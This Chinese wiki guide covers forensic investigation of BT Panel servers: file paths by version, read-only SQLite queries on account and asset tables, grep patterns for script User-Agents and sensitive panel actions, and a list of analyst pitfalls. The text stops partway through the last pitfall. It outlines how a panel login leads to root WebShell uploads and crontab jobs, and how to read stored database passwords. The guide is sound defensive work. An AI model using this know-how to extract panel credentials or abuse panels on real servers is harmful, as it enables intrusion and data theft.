---
title: "宝塔面板取证"
slug: "server-panel-bt-panel-forensics"
canonical: "https://www.digiforensics.cn/wiki/server-panel-bt-panel-forensics"
license: "CC-BY-SA-4.0"
author: "DigiForensics"
updated_at: "2026-10-09T12:51:51+08:00"
source_url: null
references: ["https://creativecommons.org/licenses/by-sa/4.0/deed.zh-hans"]
source_type: "wiki-sync"
category: "server"
space: "服务器与云取证"
node_path: ["面板与控制台"]
---

# 宝塔面板取证

<a id="section-1"></a>

## 一、概述

宝塔面板（BT Panel）是国内常见的 Linux 建站与服务器管理面板。

它的取证价值来自一个事实：宝塔不是"一个网站管理工具"，而是一个以 root 权限运行的管理入口。面板账户一旦失守，攻击者获得的能力等同于 SSH root 登录——可以写文件、建计划任务、管数据库、改防火墙，**本身没有提权过程**。

这带来两个方向完全相反的取证需求：

- **向上追**：谁在什么时候用过面板？如果攻击者是从面板进来的，`request.log` 里的登录记录是最初入口的证据，可与系统日志交叉核对。
- **向下挖**：面板数据库里存着这台服务器的**资产清单**——站点、数据库、账号、口令、备份路径。**拿到面板数据库等于拿到一张攻击面地图。**

**与办公环境最大的不同**：宝塔面板会**自己生成并保留大量日志与状态文件**。运维人员日常点过的每一次"保存"，都会在 `action.log` 里留下痕迹。

这些痕迹可作为调查线索——它们记录的是"人做了什么操作"，而不只是"系统发生了什么"。

本篇的核心问题因此不是"站点被攻击了吗"，而是"面板被谁用过"。

如果在 `request.log` + `action.log` 中定位到攻击者使用面板的完整时间线，就能解释站点上所有"以 root 权限出现、但没有任何提权痕迹"的可疑文件——**因为它们本来就是 root 直接写的**。

找不到提权痕迹不等于没有提权需求，只说明入口是面板。

**在取证流程中的位置**：本篇属于**分析环**，输入是 [Linux 服务器取证工件地图](server-panel-linux-server-artifact-map.md) 已固定的站点与面板目录，输出是**账号身份、登录时间线、资产清单**三条线。它与后面的几篇分工明确：新版数据库的加密处理见 [宝塔新版加密数据解密](server-panel-bt-panel-encrypted-data.md)，其他面板见 [其他面板取证](server-panel-hosting-control-panel-forensics.md)，面板上传的文件怎么查见 [网站目录与 WebShell 检测](../server-web/server-web-webshell-detection.md)。面板的定位决定了取证优先级——它应该比系统日志更早被查。

**涉及的证据形态**（宝塔 7.x 与 8.x 的路径差异必须先判定）：

| 内容 | **7.x 及较早** | **8.x / 新版架构** |
|---|---|---|
| 主数据库 | `/www/server/panel/data/default.db` | `/www/server/panel/data/db/default.db` |
| 站点与数据库明细 | 在 `default.db` 内 | **拆出** `data/db/database.db`、`data/db/panel.db` |
| IV 文件 | 无 | `/www/server/panel/data/div.pl` |
| 请求日志 | `/www/server/panel/logs/request.log` | 同左（可能有归档） |
| 操作日志 | `/www/server/panel/data/log/` | 同左 |
| 站点配置 / 面板入口 | `/www/server/panel/vhost/` | 同左；入口为 `data/admin_path.pl`、`data/port.pl` |

> **版本判定的实用方法**：看 `data/db/` 目录是否存在且有多个 `.db` 文件，以及 `div.pl` 是否存在。有 `data/db/` + `div.pl` = 新版架构（7.7 之后引入）。判定结果直接决定后续用哪套解密方案。

**`users` 表是取证价值最高的一张表**，它同时回答三个问题：面板上有哪些账号（是否存在攻击者创建的陌生账户）、谁登录过、从哪登录（`login_ip` 与 `login_time` 直接指向来源）。

`request.log` 是整个面板取证中最高价值的单个文件（格式类似 Nginx access.log）：

时间戳告诉你**有没有人在非常规时间登录**；来源 IP 告诉你**是不是陌生地址**；HTTP 状态码告诉你**登录成功还是失败**（`POST /login 200` 通常是成功跳转）；User-Agent 告诉你**是不是脚本而非人**（`python-requests`、`curl` 是明显信号）；后续请求路径告诉你**登录后做了什么**（`/file`、`/database`、`/crontab` 是敏感操作）。

**`action.log` 记录"执行了什么操作"**，两者分工与缺失后果见 2.5。

据此要回答的问题：面板上有哪些账号、谁在什么时候从哪登录过、面板账号的口令是否被改过、这台服务器上部署了哪些站点与数据库、面板是否暴露在公网、运维人员声称没做过的操作在日志里有没有。

站点目录里的 WebShell 具体怎么工作（那要进 [网站目录与 WebShell 检测](../server-web/server-web-webshell-detection.md)）；新版架构里加密字段的解密（见 [宝塔新版加密数据解密](server-panel-bt-panel-encrypted-data.md)）；`action.log` 可能已被攻击者删除或清空——不存在或 size 为 0 时记为"操作日志缺失"，不要臆测内容；面板日志有轮转，覆盖的时段只能写"未覆盖"。

**判读上的一条硬规矩**：区分"运维的正常访问"与"攻击者访问"，**判据不是"IP 陌生"，而是时间模式**——运维通常在工作时间、有 Referer、UA 是真实浏览器；攻击者常在深夜、UA 是脚本、Referer 为空。

**内容边界**：本文用于**已获得合法授权**的取证场景。面板数据库中包含真实口令等敏感信息，提取与分析必须在受控环境内完成，不得二次扩散——报告中一律脱敏。本篇检测面板暴露面与异常账户时，写的是**如何识别、如何排除误报**（如运维用脚本做批量操作同样表现为脚本 UA），**不涉及面板的利用方式**。

**读者前提**：需要 [SQLite 基础与结构](../../mobile/mobile-database/mobile-database-sqlite.md) 的表读取能力、[Linux 服务器取证工件地图](server-panel-linux-server-artifact-map.md) 的路径全景，以及基本的 Web 服务与面板认知。**建议先做版本架构判定**（[3.1 第 1 步](#section-11)）——7.x 与 8.x 的路径和解密方案完全不同，判错版本后面全错。
<a id="section-2"></a>

## 二、核心原理

<a id="section-3"></a>

### 2.1 目录结构与 7.x / 8.x 路径差异

宝塔几乎把所有东西都装在 `/www` 下（早期版本可在安装时自定义路径，部分环境装在 `/www` 以外的目录，**以实际样本为准**）。关键差异集中在数据库文件的位置：

| 内容 | **7.x 及较早** | **8.x / 新版架构** | 取证价值 |
|---|---|---|---|
| 面板程序 | `/www/server/panel/` | 同左 | ★★★ |
| 主数据库 | `/www/server/panel/data/default.db` | `/www/server/panel/data/db/default.db` | ★★★★★ |
| 站点与数据库明细 | 在 `default.db` 内 | **拆出** `data/db/database.db`、`data/db/panel.db` | ★★★★★ |
| IV 文件 | 无 | `/www/server/panel/data/div.pl` | ★★★★ |
| 请求日志 | `/www/server/panel/logs/request.log` | 同左（可能有归档） | ★★★★★ |
| 操作日志 | `/www/server/panel/data/log/` | 同左 | ★★★★★ |
| 站点配置 | `/www/server/panel/vhost/` | 同左 | ★★★★★ |
| 站点根目录 | `/www/wwwroot/` | 同左 | ★★★★★ |
| 网站日志 | `/www/wwwlogs/` | 同左 | ★★★★★ |
| 备份 | `/www/backup/` | 同左 | ★★★★ |
| 面板入口配置 | `/www/server/panel/data/admin_path.pl` | 同左 | ★★★★ |
| 面板端口配置 | `/www/server/panel/data/port.pl` | 同左 | ★★★★ |
| SSL 配置 | `/www/server/panel/data/ssl.pl`、`panel_ssl.pl` | 同左 | ★★★★ |

> **版本判定的实用方法**：看 `data/db/` 目录是否存在且有多个 `.db` 文件，以及 `div.pl` 是否存在。有 `data/db/` + `div.pl` = 新版架构（7.7 之后引入），旧版只有单一的 `data/default.db`。判定结果决定了后续用哪套解密方案，见[第 03 篇](server-panel-bt-panel-encrypted-data.md)。

<a id="section-4"></a>

### 2.2 面板数据库 `default.db` 的结构

旧版 `default.db` 是标准 SQLite3，**可以直接用 `sqlite3` 打开读表**。核心表：

| 表名 | 内容 | 取证价值 |
|---|---|---|
| `config` | 面板配置（端口、安全入口、口令哈希、**MySQL root 口令**等） | ★★★★★ |
| `users` | **面板账户**：`username`、`password`、`salt`、`login_ip`、`login_time` 等 | ★★★★★ |
| `sites` | 站点列表：`name`、`path`、`status` | ★★★★★ |
| `databases` | 数据库列表：`name`、`username`、`password`、`accept` | ★★★★★ |
| `logs` | 部分版本的记录表（结构随版本变化） | ★★★ |

**`users` 表的取证价值最高**，它同时回答三个问题：

1. **面板上有哪些账号**——是否存在攻击者创建的陌生账户。
2. **谁登录过、从哪登录**——`login_ip` 与 `login_time` 直接指向来源。
3. **口令是否被改过**——配合 `salt` 与 `password` 字段可判断。

> ⚠️ **安全提示**：`default.db` 里的 `databases.password`、`config` 中的 MySQL root 口令，在旧版里**部分场景下是明文或可逆编码**。这既是取证机会，也是敏感数据——取出的数据库文件必须按涉密证据管理，不要随意复制到个人设备。

<a id="section-5"></a>

### 2.3 新版架构的数据库拆分

新版（7.7+ 之后）把原本一个大库拆成多个，原因是不同数据需要不同的加密策略：

```
/www/server/panel/data/db/
├── default.db      ← 主库（较旧版本的部分表）
├── database.db     ← 数据库账户信息（databases 表，含加密口令）
└── panel.db        ← 面板自身配置（config 表，含 mysql_root 等）
```

**新版的加密特征**：敏感字段值形如 `BT-0x:` + 一段 Base64 密文。识别到 `BT-0x:` 前缀，就说明遇到的是新版加密机制。解密流程与可运行的 Python 脚本见[第 03 篇](server-panel-bt-panel-encrypted-data.md)。

> **本篇只需记住一件事**：看到 `BT-0x:` 就不要试图手工猜，去第 03 篇。

<a id="section-6"></a>

### 2.4 面板日志：`request.log` 的价值

这是**整个面板取证中最高价值的单个文件**。它记录面板 Web 界面的所有 HTTP 请求，格式与 Nginx access.log 类似：

```
2024-03-17 22:41:03 198.51.100.24 GET /login 200 1024 "-" "Mozilla/5.0 ..."
2024-03-17 22:41:07 198.51.100.24 POST /login 200 512 "-" "Mozilla/5.0 ..."
```

| 能回答的问题 | 用到的字段 |
|---|---|
| 有没有人在非常规时间登录面板 | 时间戳 |
| 是不是陌生 IP | 来源 IP |
| 登录成功还是失败 | HTTP 状态码（`POST /login 200` 通常是成功跳转） |
| 是不是脚本而非人 | User-Agent（`python-requests`、`curl` 等是明显信号） |
| 登录后做了什么 | 后续请求路径（`/file`、`/database`、`/crontab` 等是敏感操作） |

**取证关键点**：先确定日志的时间跨度（`request.log` 会轮转，更早的可能已压缩或删除）。

区分"运维人员的正常访问"和"攻击者访问"——判据不是"IP 陌生"，而是**时间模式**：运维通常在工作时间、有 Referer、UA 是真实浏览器，攻击者常在深夜、UA 是脚本、Referer 为空。

最后把面板日志与网站 access.log 对齐：若 `POST /file`（文件管理上传）之后网站日志出现对应文件的首次访问，两条时间线吻合即可锁定"面板上传"路径。

<a id="section-7"></a>

### 2.5 操作日志 `action.log`

`request.log` 记录"谁访问了哪个 URL"，`action.log` 记录"执行了什么操作"。前者定位入口，后者定位行为。`action.log` 通常记录面板内的敏感动作：登录/登出、修改密码、添加网站、修改数据库、编辑文件、创建计划任务、备份、启停服务。

**取证价值**：找到**非常规时间**的操作；找到**运维人员声称没做过的操作**；定位**攻击者利用面板做了哪几件事**（上传文件 → 建计划任务 → 改配置）。

> ⚠️ **陷阱**：`action.log` 格式在不同版本中差异较大，且可能被攻击者删除或清空。先看文件是否存在、size 与 mtime 是否异常（被修改过），再看内容。若不存在或 size 为 0，记为"操作日志缺失"，不要臆测内容。

<a id="section-8"></a>

### 2.6 面板 SSL 与安全入口

| 机制 | 配置文件 | 含义 | 取证意义 |
|---|---|---|---|
| **安全入口** | `data/admin_path.pl` | 面板 URL 带一段随机路径 | 入口泄露本身即风险信号 |
| **面板 SSL** | `data/ssl.pl`、`panel_ssl.pl` | 面板走 HTTPS | 加密传输，但日志仍明文记录 |
| **面板端口** | `data/port.pl` | 默认 `8888`，旧版 `888` | 端口是识别面板类型的第一线索 |

**取证判断**：若 `admin_path.pl` 内容为空或为默认值（如 `/`），说明**安全入口被关闭**，是可写入报告的安全风险项。

若面板仍走 HTTP，登录口令在网络中明文传输，可作为攻击路径的辅助推断。

**面板端口对外暴露本身就是高危**——若 8888 监听 `0.0.0.0` 而非仅内网，说明面板直接暴露公网，是被入侵的前置条件之一。

<a id="section-9"></a>

### 2.7 面板本身是攻击目标

把这一条单列，因为它决定了取证的重点。**通过面板，攻击者无需任何提权漏洞就能完成**：

```
面板登录成功（一个 Web 口令）
   ↓
文件管理 → 以 root 权限上传 WebShell 到任意站点
   ↓
计划任务 → 新建 crontab（面板以 root 执行命令）
   ↓
数据库 → 导出/修改业务库，或读取数据库口令
   ↓
终端 → 面板自带 root SSH 终端，执行任意命令
```

因此本篇的核心问题不是"站点被攻击了吗"，而是"面板被谁用过"。

如果能在 `request.log` + `action.log` 中定位到攻击者使用面板的完整时间线，就能解释站点上所有"以 root 权限出现、但没有任何提权痕迹"的可疑文件——因为它们本来就是 root 直接写的。

---

<a id="section-10"></a>

## 三、操作步骤

<a id="section-11"></a>

### 3.1 第 1 步：确认面板存在与版本架构

```bash
# 面板主目录
ls -d /mnt/df/www/server/panel 2>/dev/null && echo "→ 宝塔面板环境"

# 判定架构版本（旧版单库 vs 新版 data/db/ 拆分）
ls -l /mnt/df/www/server/panel/data/default.db 2>/dev/null
ls -l /mnt/df/www/server/panel/data/db/ 2>/dev/null
ls -l /mnt/df/www/server/panel/data/div.pl 2>/dev/null     # 新版才有

# 从面板自身记录里读版本号（以实际文件为准，字段名可能随版本变化）
cat /mnt/df/www/server/panel/data/version.pl 2>/dev/null
strings -n 6 /mnt/df/www/server/panel/class/common.py 2>/dev/null | grep -iE 'version' | head -5
```

> 上述版本读取路径在不同小版本中并不完全一致，**务必以实际样本验证**；读不到就用 `data/db/` 目录与 `div.pl` 的有无来判定架构分支。

<a id="section-12"></a>

### 3.2 第 2 步：固定面板数据与日志

面板 SQLite 数据库在面板运行时**可能正在被写**，所以现场在线时应优先 `cp`（不要在停服后才想起）。所有操作只读。

```bash
# 面板数据目录（default.db / div.pl / admin_path.pl / port.pl / log/）
cp -rp /mnt/df/www/server/panel/data /evidence/bt-data/
# 面板日志（request.log 是最高价值文件，优先）
cp -rp /mnt/df/www/server/panel/logs /evidence/bt-logs/
# 站点配置
cp -rp /mnt/df/www/server/panel/vhost /evidence/bt-vhost/
# 记录哈希，保证证据链完整
find /evidence/bt-data /evidence/bt-logs -type f -exec sha256sum {} + | tee /evidence/bt-hashes.txt
```

<a id="section-13"></a>

### 3.3 第 3 步：读取面板账户（`users` 表）

`sqlite3` 直接以只读方式打开（`file:...?mode=ro` 确保不写入）：

```bash
# 列出所有表（先看结构，避免猜表名）
sqlite3 "file:/evidence/bt-data/default.db?mode=ro" ".tables"

# 读面板账户（新版若 default.db 里没有，看 data/db/panel.db）
sqlite3 -header -column "file:/evidence/bt-data/default.db?mode=ro" \
  "SELECT username, login_ip, login_time FROM users;"

# 全部字段（确认列名后再筛）
sqlite3 "file:/evidence/bt-data/default.db?mode=ro" "PRAGMA table_info(users);"
sqlite3 -header -column "file:/evidence/bt-data/default.db?mode=ro" "SELECT * FROM users;"
```

| 检查项 | 期望 | 异常信号 |
|---|---|---|
| 面板账户数量 | 1～2 个（管理员 + 可选） | **多个账户，或名字陌生的账户** |
| `login_ip` | 管理员常用 IP / 内网段 | **陌生公网 IP，尤其是与站点被攻击时间吻合的** |
| `login_time` | 常规工作时间 | **深夜时段，或与入侵时间吻合** |
| 是否有 `safe_path`/入口被改 | 保持原样 | 被清空（安全入口关闭） |

> **务必交叉验证**：面板 `users` 表的 `login_time`/`login_ip` 是数据库内的**最后一次登录**记录，会被后续登录覆盖。要还原完整登录历史，必须以 `request.log` 为主。见 3.4。

<a id="section-14"></a>

### 3.4 第 4 步：分析面板请求日志（核心步骤）

这是定位"谁在什么时候用过面板"的主战场。

```bash
# 4.1 先确认日志覆盖的时间范围（决定结论边界）
ls -l --time-style=long-iso /evidence/bt-logs/      # 最早一份决定可回溯的起点
# 4.2 提取所有登录尝试（成功与失败）
grep -E 'POST /login|/login\b' /evidence/bt-logs/request.log* | head -50
# 4.3 找出所有访问面板的来源 IP 与次数（识别陌生 IP）
awk '{print $1}' /evidence/bt-logs/request.log* | sort | uniq -c | sort -rn | head -30
# 4.4 找敏感操作：文件管理、数据库、计划任务、终端
grep -E '/(file|filemanager|db|database|crontab|terminal|exec|cmd)' \
     /evidence/bt-logs/request.log* | head -50
# 4.5 找脚本类 User-Agent（自动化操作的信号）
grep -E 'python-requests|curl/|wget/|python-urllib|Go-http-client' \
     /evidence/bt-logs/request.log* | head -30
```

**读日志的判定逻辑**：

| 观察 | 推断 | 强度 |
|---|---|---|
| 某 IP 在 `POST /login` 后紧跟大量 `/file` 等操作，且 UA 是脚本 | **该 IP 高度可疑，用脚本自动化利用面板** | 强（需与 `action.log` 和落地文件交叉印证） |
| 登录 IP 为陌生公网 IP，与站点 WebShell 落地时间相差几分钟 | 面板是**入侵入口** | 强（时间链吻合） |
| 登录 IP 是管理员常用 IP，但时间在深夜 | 需进一步核实（可能账号被盗，也可能是合法夜间运维） | 中 |
| 面板 IP 是 CDN/代理 IP | 无法直接归因，需结合 `X-Forwarded-For`（若日志有记录） | 弱，需更多佐证 |

<a id="section-15"></a>

### 3.5 第 5 步：分析操作日志 `action.log`

```bash
ls -l /evidence/bt-data/log/ /evidence/bt-data/data/log/ 2>/dev/null
# 找敏感操作关键字（增删改站点/数据库/计划任务/文件）
grep -iE 'upload|file|edit|add|delete|cron|database|site|backup|passwd|password' \
     /evidence/bt-data/log/action.log 2>/dev/null | tail -50
# 检查日志自身是否被改动过（被清理的痕迹）
stat -c '%n  size=%s  mtime=%y  ctime=%z' /evidence/bt-data/log/action.log 2>/dev/null
```

> `action.log` 的格式随版本差异较大，上面是关键字检索思路，**具体字段以实际文件为准**。

<a id="section-16"></a>

### 3.6 第 6 步：站点与数据库资产清单

这既是"这张服务器上有什么"的答案，也是"攻击者能拿到什么"的评估依据。

```bash
# 站点列表（从数据库；旧版从 default.db 读，新版位置以实际为准）
sqlite3 -header -column "file:/evidence/bt-data/default.db?mode=ro" \
  "SELECT name, path, status FROM sites;"
# 数据库列表（口令字段可能是明文或 BT-0x: 密文）
sqlite3 -header -column "file:/evidence/bt-data/db/database.db?mode=ro" \
  "SELECT name, username, password, accept FROM databases;"
# 站点根目录实际存在哪些站点（与数据库记录比对，找"幽灵站点"）
ls -la /mnt/df/www/wwwroot/
```

| 交叉检查 | 异常含义 |
|---|---|
| 数据库有记录但 `/www/wwwroot/` 无对应目录 | 站点被删除过，数据库记录残留 |
| `/www/wwwroot/` 有目录但数据库无记录 | **站点是绕过面板手工添加的**——高度可疑 |
| `databases.accept` 允许 `0.0.0.0`（任意 IP） | 数据库暴露公网，是横向与数据泄露的入口 |

<a id="section-17"></a>

### 3.7 第 7 步：面板入口、暴露面与备份

```bash
# 安全入口与端口
cat /evidence/bt-data/admin_path.pl 2>/dev/null
cat /evidence/bt-data/port.pl 2>/dev/null
ls -l /mnt/df/www/server/panel/data/ssl.pl /mnt/df/www/server/panel/data/panel_ssl.pl 2>/dev/null
# 面板监听地址（在线时查）
ss -tulpn | grep -E ':8888|:888'      # 0.0.0.0 = 直接暴露公网
# 备份目录（勒索/篡改案件必查）
ls -la /mnt/df/www/backup/
find /mnt/df/www/backup -maxdepth 2 -type d -printf '%TY-%Tm-%Td %m %u:%g  %p\
' | sort
```

---
<a id="section-18"></a>

## 四、常见陷阱

面板取证的误判，重灾区不在数据库里，而在**「面板上有人用过」与「谁在用」的判别**上。

本篇最容易出错的三类：① 把数据库里的**最后一次**状态当成历史；② 把**路径找错**当成数据不存在；③ 把**共享 IP / 代理出口**当成攻击者归因。

本章按「数据库判读 → 路径与固定 → 归因与结论」三段归组。

<a id="section-19"></a>

### 4.1 数据库判读：状态 vs 历史

<a id="section-20"></a>

#### 陷阱 1：把 `users` 表的 `login_time` 当完整登录历史

**现象**：从 `users` 表读出 `login_ip = 198.51.100.24`、`login_time = 2024-03-17 22:41`，报告写「攻击者于该时刻登录面板」，并把这当作登录行为的完整记录。

**原因**：`users` 表里存的是**最后一次登录**的快照，**每发生一次新登录就覆盖前一条**。它没有历史表、没有时间序列。

所以从这张表读出的时间只能说明「最后一次是谁」，不能说明「一共来过几次、分别在什么时候」——而「一次」和「多次」在归因上完全不同：一次可能是口令泄露后的单次利用，多次意味着攻击者反复回归。

**影响**：**凭空把「最后一次登录」说成「登录历史」**。报告会漏掉更早的探测性登录（`POST /login` 返回 401/403 的那些），也会漏掉「运维正常登录在先、攻击者在后」这个顺序——而**顺序恰恰是定性入侵路径的关键**。

**核查**：`request.log` 是唯一的登录历史来源，数据库只是佐证。

先用日志把完整时间线拉出来（所有 `POST /login`，含成功与失败、含各次时间），再用 `users` 表确认**最后一次登录的 IP 与面板账户**与日志末条一致。

报告里两者都要引，并注明「`users` 表为最后一次登录快照，完整历史以 `request.log` 为准」。

如果 `request.log` 已被轮转掉，就只能写「可确认最后一次登录，无法还原完整登录序列」，不能拿数据库补。

<a id="section-21"></a>

#### 陷阱 2：默认路径 `data/default.db`，读到空库或残库

**现象**：`sqlite3 data/default.db ".tables"` 返回空或表不全，于是报告写「该面板数据库无站点记录」，甚至下结论「这台服务器未使用面板管理站点」。

**原因**：**7.7 之后引入了新架构**，主库被拆到 `data/db/` 下（`default.db`、`database.db`、`panel.db`），站点与数据库明细**已经不在旧路径**。

另外早于该版本的安装也可能自定义过安装目录——宝塔「几乎把所有东西都装在 `/www` 下」是常态而非保证。

所以旧路径打不开有三种完全不同的成因：路径变了、装在别处、**库是加密的所以看起来是空的**。

**影响**：「读到空」被当成「没有数据」，进一步被当成「没有资产」——于是攻击面评估里整块面板资产消失，站点与数据库清单都不完整。

**核查**：**先判架构分支，再决定读哪个文件。**

判据是两条并看：`ls -l data/db/` 是否存在且含多个 `.db`、以及 `data/div.pl` 是否存在（新版才有）。有 `data/db/` + `div.pl` = 新版。

然后：`sites` 表在旧库、数据库账户在 `data/db/database.db`、面板自身配置在 `data/db/panel.db`。

**读不出来不等于没有**——写「该路径下未找到可读的主库，已确认架构为新版，明细需按新版路径读取」，并把两个路径都列进「已检查范围」。

<a id="section-22"></a>

#### 陷阱 3：在面板运行时直接打开 `default.db`

**现象**：为了省事，在仍然运行的服务器上直接 `sqlite3 /www/server/panel/data/default.db "SELECT ..."`。

**原因**：面板运行时这个 SQLite 库**可能正处于写入状态**。你读到的可能是**事务中间态**——表缺行、字段半写、值新旧混杂。

更麻烦的是 SQLite 打开数据库的方式会影响它：直接读写打开会创建 `-wal`/`-shm` 文件并可能触发 checkpoint，把 WAL 里的数据合并回主库——**这是对正在运行的证据文件的写入**。

**影响**：**污染了证据本身**。`-wal` 的存在说明库处于 WAL 模式，其内容是你来之前的事务；一旦被合并回主库，原始的事务边界就再也说不清了。此外，读到半写入状态的数据会被当成事实写进报告。

**核查**：**永远只读打开，且在副本上做。**

现场先 `cp -rp` 整个 `data/`、`logs/`、`vhost/` 到证据目录，之后所有 SQLite 操作都在**副本**上、用 `file:...?mode=ro` 打开。

在线系统上的原件只是「某时刻的副本」，一致性无法保证——这一条要写进证据说明。

若必须在原件上操作，用 `mode=ro` 且不加任何写事务，并记录操作时刻。

<a id="section-23"></a>

#### 陷阱 4：看到陌生 IP 登录就定性为攻击者

**现象**：`request.log` 里出现一个陌生公网 IP 完成了 `POST /login 200`，报告直接写「攻击者 IP 为 X」。

**原因**：陌生 ≠ 攻击。这个 IP 至少有四种合法来源：

① **共享 IP**——办公出口、运营商 NAT、公司统一网关。

② **代理 / VPN 出口**——运维走跳板。

③ **移动网络**——IP 每次都变。

④ **CDN / 反代回源 IP**——面板若挂在 SLB/反代后面，日志里记的是回源地址。

**判据不是「IP 陌生」，而是行为模式。**

**影响**：**把运维的正常访问判成攻击**，报告从一开始就站不住；反过来也有另一种错——**只看「IP 陌生」就放过一条真实攻击链**。更麻烦的是 IP 归因一旦写错，后续的通报、黑名单联动全跟着错。

**核查**：**看时间模式与后续动作的组合，不看 IP 本身。**

强信号是**登录成功后立刻出现敏感操作**（`/file`、`/database`、`/crontab`、`/terminal`）且间隔很短——正常运维的访问路径是分散的、有人类操作节奏的。

弱信号只有「时间在深夜」或「UA 是脚本」，两者单独都不足以下结论。

若面板在反代后面，先确认日志里的 IP 是入口还是回源——`X-Forwarded-For` 只有在面板配置了信任该头时才可信，否则可被任意伪造。归因结论要写明「该 IP 为 X，若面板位于反向代理后则实际来源需结合 `X-Forwarded-For` 与代理侧日志确认」。

<a id="section-24"></a>

#### 陷阱 5：以为「装了面板就一定留 SSH 登录记录」

**现象**：`/var/log/auth.log` 里找不到案发时段的登录，报告写「攻击者未通过 SSH 进入」，进而怀疑是别的漏洞。

**原因**：**面板操作完全不经 SSH。** 面板自带终端功能是以面板进程（root）的权限直接 `fork` 执行命令，**不产生任何 SSH 会话记录**，也不写 `auth.log`/`wtmp`。案例里攻击者完成了完整的登录、文件上传、后续操作，`auth.log` 里干干净净——这不是「没发生」，而是「不走这条路」。

**影响**：**把「没走 SSH」当成排除依据**，可能反过来去寻找一个根本不存在的 SSH 入侵路径，甚至质疑委托方提供的「未开放 SSH 密码登录」这一前提。

**核查**：**面板痕迹只能从面板自己的工件里找。** 至少三条独立来源要一起查：

① `logs/request.log`（HTTP 请求层）。

② `data/log/action.log`（操作层）。

③ **站点目录与 Web 访问日志**（结果层——面板操作会以 root 身份在站点里留下文件）。

报告里写「`auth.log` 在该时段无 SSH 登录记录」时，必须紧跟一句「该结论与面板操作路径无关，面板操作不产生 SSH 记录」，否则读者会误以为这条否定性证据加强某个错误假设。

<a id="section-25"></a>

### 4.2 路径与固定

<a id="section-26"></a>

#### 陷阱 6：★ 把 `databases.password` 明文写进报告

**现象**：从 `databases` 表里查到数据库口令，直接粘进报告正文，或者存成明文 `secrets.txt` 随手放桌面。

**原因**：旧版库里 `databases.password` 常常就是明文或可直接还原的编码，新版才是 `BT-0x:` 密文。查出来「很容易」这件事，掩盖了它是一份**真实的生产数据库凭据**的事实。

**影响**：报告是要流转的——会交给委托方法务、可能进诉讼、可能被当成附件发出。明文口令一旦离开受控环境，泄露范围就等于所有拿到报告的人，而这类泄露事后极难界定责任。

另外数据库备份（`/www/backup/`）里同样含明文口令，把备份文件直接进证据目录而不做密级登记也是同一个问题。

**核查**：**报告里只写存在性与属性**——「已获取数据库 `shop_db` 的口令（20 位，含大小写与数字，已脱敏，密级保管）」。

确需交付完整值时**单独加密保管、单独登记哈希、单独走移交流程**，不放正文、不进代码仓库、不进聊天工具。

取证过程本身遵循最小化原则：**能证明「拿到了」就不必证明「拿到的是什么」**，除非轮换验证确实需要，那就在受控环境里验证。

<a id="section-27"></a>

#### 陷阱 7：只看 `request.log`，不看站点目录

**现象**：面板日志被攻击者清空了（文件 size 变 0 或 mtime 异常），报告写「无面板操作记录，未发现面板被使用」。

**原因**：**攻击者清理面板日志，恰恰说明他用过面板**——因为这是他需要清理的东西。

清理动作本身留下了痕迹（`action.log` 可能没被清、`data/` 里的 mtime 变了、日志文件的 ctime 与 mtime 不一致）。

更关键的是，**面板操作的结果不依赖面板日志而存在**：上传的 WebShell 就在站点目录里，导出的数据库 dump 就在 `/www/backup/` 或临时目录里，建的计划任务就在 crontab 里。

**影响**：**把「日志没了」当成「没发生」**，整条面板入侵线被放弃，而站点上那些「以 root 身份写入、没有任何提权过程」的异常文件反而变成无法解释的孤证。

**核查**：**三源交叉，任意一源不可用都不能否定另外两源。**

① `request.log` + `action.log`（行为层）。

② 站点目录、`/www/wwwroot` 的异常文件与 crontab（结果层）。

③ 面板数据库 `users` 表的 `login_ip`/`login_time`（状态层）。

日志被清空时，报告要写「操作日志缺失（file size=0，mtime 与 ctime 不一致，判定为清理）」——这是攻击行为的证据，不是取证失败。

另外必须去查日志文件的清理是否早于/晚于 WebShell 落地时间，顺序本身就是线索。

<a id="section-28"></a>

#### 陷阱 8：只看 `/www/server/panel`，不比对 `vhost/` 与真实站点

**现象**：面板数据库里只有 3 个站点记录，报告照此写「该服务器共 3 个站点」。

**原因**：**面板数据库与实际生效的站点不是同一份事实**，三处可能不一致：

① 站点目录存在但数据库无记录——**绕过面板手工建的站点，高度可疑**（成因之一是用面板终端建的站）。

② 数据库有记录但目录不存在——站点被删过，**记录残留本身是痕迹**。

③ 面板生成在 `panel/vhost/` 的配置**与最终生效的配置不一致**——被手工改过 `vhost` 里对应的文件，或被另一个软件改过。

**影响**：**资产清单不完整，攻击面评估出现盲区。** 一个手工建站可能是攻击者的落地站，不在数据库里就永远查不到它的备份、它的数据库、它的操作历史。

**核查**：三方比对：`data/db`（或 `default.db`）的 `sites` 表 ↔ `/www/wwwroot/` 实际目录 ↔ `panel/vhost/` 配置文件。

三者出现任何一对不一致，都要单独记录并解释成因。

特别注意「目录有、库无」这个方向——它是手工创建的直接证据。

另外 `vhost/` 里的配置若被改过（`server_name`、`root`、`proxy_pass` 指向异常），本身就是篡改点，见[第 05 篇](../server-web/server-web-nginx-apache.md)。

<a id="section-29"></a>

### 4.3 归因与结论表述

<a id="section-30"></a>

#### 陷阱 9：把「面板暴露」直接写成「已被入侵」

**现象**：发现 `port.pl` 是 `8888`、`admin_path.pl` 为空、面板监听 `0.0.0.0`，报告直接写「该服务器已被入侵」。

**原因**：面板暴露是风险条件，入侵是事实结论，两者是不同的命题。

`admin_path.pl` 为空只说明**安全入口被关闭**（`admin_path` 机制本来就是防扫描的，它失效不代表有人利用）；`0.0.0.0:8888` 只说明**暴露面**——大量服务器这样跑着却从未被攻击。

**暴露 → 有被攻击的可能 → 实际被攻击**，这条推理链的每一环都需要独立证据。

**影响**：**结论强度凭空提升**。委托方可能据此认定入侵成立并直接走法律流程，而实际证据只支持「存在高危暴露面」；反过来，报告里把暴露和入侵混为一谈，也让真正需要证明的入侵事实被淹没。

**核查**：**分成两条独立结论写。**

风险侧：「面板监听 `0.0.0.0:8888` 且安全入口已关闭，端口可被公网直接访问——符合此类服务器被入侵的常见前置条件，构成高危配置。」

事实侧：「`request.log` 中 `198.51.100.24` 于 `<时间>` 完成 `POST /login` 并执行 `/file/upload`，站点同刻出现对应文件——**面板被实际使用，入侵成立**。」

只有事实侧那组证据能支撑「被入侵」，风险侧只能支撑「易被入侵」。

<a id="section-31"></a>

#### 陷阱 10：只查 `action.log` 一个文件

**现象**：`data/log/action.log` 格式看不懂或内容太少，就只凭这一个文件给出「面板操作行为」的全部结论。

**原因**：`action.log` 的格式在不同版本间差异很大——字段名、是否 JSON、有没有记录操作者 IP 都不一致，有的版本根本不记某些动作；而且它**可能被攻击者删除或清空**。

